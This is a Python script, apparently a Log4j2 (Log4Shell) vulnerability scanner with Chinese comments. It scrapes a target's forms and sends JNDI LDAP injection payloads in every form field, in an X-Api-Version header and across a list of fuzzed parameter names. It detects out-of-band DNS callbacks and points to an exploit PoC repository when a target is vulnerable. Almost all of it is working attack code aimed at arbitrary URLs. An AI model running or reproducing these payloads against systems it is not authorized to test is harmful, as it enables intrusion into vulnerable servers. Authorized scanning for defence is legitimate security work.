import requests
import re, urllib, random, string, time
from inc.dnslog import *

def get_form_pararm(url):       # 获取表单参数
    form_list = []
    try:
        rep = requests.get(url ,timeout=3)
        forms = re.findall(r'<form.+?</form>', rep.text, re.DOTALL)
        for form in forms:
            form_param = {}
            form_action = re.findall(r'action=[\'"]([^\'"]+)[\'"]', form)       # 解析action参数
            if len(form_action) > 0:
                form_param['action'] = form_action[0]
            else:
                form_param['action'] = url

            form_method = re.findall(r'method=[\'"]([^\'"]+)[\'"]', form)       # 解析method方法
            if len(form_method) > 0:
                form_param['method'] = form_method[0]
            else:
                form_param['method'] = 'get'

            form_param['param'] = []
            form_inputs = re.findall(r'<input.+?>', form)                       # 通过input获取提交参数
            for form_input in form_inputs:
                form_input_name = re.findall('name=[\'"]([^\'"]+)[\'"]', form_input)
                if len(form_input_name) > 0:
                    form_param['param'].append(form_input_name[0])

            form_list.append(form_param)
        return form_list
    except:
        return form_list


def log4j2_rce(url):
    relsult = {
        'name': 'Apache Log4j2 远程代码执行',
        'vulnerable': False
    }
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        rand_str = ''.join(random.sample(string.ascii_letters + string.digits, 7))
        dnslog = Dnslog()
        dnslog_domain = dnslog.dnslog_getdomain()
        target_dnslog_domain = rand_str + '.' + dnslog_domain
        # 在请求头中加payload测试 log4j2远程代码2
        headers['X-Api-Version'] = '${jndi:ldap://' + target_dnslog_domain + '/ping}'

        if dnslog_domain:
            p = 'payload'

            forms_list = get_form_pararm(url)       # 自动填写表单发送
            if len(forms_list) > 0:
                for form in forms_list:
                    payload = ''
                    for p in form['param']:
                        payload += '{0}=%24%7bjndi%3aldap%3a%2f%2f{1}%2fping%7d'.format(p, target_dnslog_domain)
                        payload += '&'
                    payload = payload.rstrip('&')
                    action_url = urllib.parse.urljoin(url, form['action'])
                    if form['method'] == 'post':
                        try:
                            requests.post(action_url, headers=headers, data=payload, timeout=0.1)
                        except:
                            pass
                    elif form['method'] == 'get':
                        payload = '?' + payload
                        vurl = urllib.parse.urljoin(action_url, payload)
                        try:
                            requests.get(vurl, timeout=0.1)
                        except:
                            pass


            payload = ''            # 如果没有获取到表单就fuzz一些参数
            p_list = [
                'payload', 'id', 'key', 'action', 'm', 'page', 'a', 'page', 'search', 'username', 'password',
                'name', 'uid', 'num', 'searchkey', 'url', 's', 'b', 'c', 'city', 'move', 'step', 'method',
            ]
            for p in p_list:
                payload += '{0}=%24%7bjndi%3aldap%3a%2f%2f{1}%2fping%7d'.format(p, target_dnslog_domain)
                payload += '&'
            payload = payload.rstrip('&')
            vurl_get = urllib.parse.urljoin(url, '?' + payload)
            vurl_post = url
            try:
                requests.get(vurl_get, headers=headers, timeout=0.1)
            except:
                pass
            try:
                requests.post(vurl_post, data=payload, headers=headers, timeout=0.1)
            except:
                pass

            dnslog.dnslog_sleep()
            dnslog_rep = dnslog.dnslog_getrep()
            if re.search(rand_str, dnslog_rep) and re.search(dnslog_domain, dnslog_rep):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['verify_dnslog'] = target_dnslog_domain
                relsult['exp'] = 'https://github.com/nice0e3/log4j_POC'

        return relsult
    except:
        return relsult


if __name__ == '__main__':
    url = input('url:')
    print(log4j2_rce(url))
